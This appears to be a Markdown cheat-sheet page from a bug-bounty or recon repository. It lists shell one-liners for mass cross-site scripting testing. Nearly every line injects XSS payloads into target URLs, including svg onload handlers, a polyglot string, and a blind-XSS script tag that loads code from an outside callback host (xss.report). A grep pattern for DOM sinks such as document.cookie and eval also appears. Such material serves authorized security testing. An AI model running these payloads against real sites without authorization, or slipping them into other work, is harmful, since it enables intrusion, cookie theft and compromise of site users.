[← Back to README](../Readme.md)

---

## 💉 XSS Detection

### Dalfox Pipeline
```bash
cat urls.txt | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence --skip-bav
```

### Blind XSS with Callback
```bash
cat urls.txt | gf xss | qsreplace '"><script src=https://xss.report/c/YOURID></script>' | httpx -silent
```

### Airixss Fast Scan
```bash
echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```

### Knoxss API
```bash
cat urls.txt | gf xss | uro | xargs -I@ curl -s "https://knoxss.me/api/v3" -d "target=@" -H "X-API-KEY: YOUR_KEY"
```

### DOM XSS Detection
```bash
cat js.txt | xargs -I@ bash -c 'curl -s @ | grep -E "(document\.(location|URL|cookie|domain|referrer)|innerHTML|outerHTML|eval\(|\.write\()" && echo "--- @ ---"'
```

### Mass XSS with Nuclei DAST
```bash
cat urls.txt | httpx -silent | nuclei -dast -t dast/vulnerabilities/xss/ -rl 50
```

### Reflected Parameter Detection
```bash
cat urls.txt | kxss 2>/dev/null | grep -v "Not Reflected" | anew reflected_params.txt
```

### XSS Polyglot Testing
```bash
cat urls.txt | gf xss | qsreplace "jaVasCript:/*-/*\`/*\`/*'/*\"/**/(/* */oNcLiCk=alert() )//" | httpx -silent -mr "alert"
```

---

[← Back to README](../Readme.md)
